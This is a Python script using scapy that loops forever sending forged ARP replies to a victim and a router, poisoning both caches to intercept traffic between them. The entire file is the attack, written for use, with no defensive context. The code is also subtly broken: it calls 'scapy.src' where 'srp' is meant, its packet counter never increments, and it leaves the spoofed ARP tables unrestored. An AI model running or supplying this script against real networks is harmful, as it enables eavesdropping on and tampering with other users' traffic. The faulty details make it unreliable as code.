import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.src(arp_request_broadcast, timeout=1)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


sent_packet_count = 0

try:
    while True:
        spoof('victim_ip', 'router_ip')
        spoof('router_ip', 'victim_ip')
        print(f'\r[INFO] Sent two packets: {sent_packet_count + 2}', end='')
        time.sleep(3)
except KeyboardInterrupt:
    print('[INFO] Delected CTRL + C....')
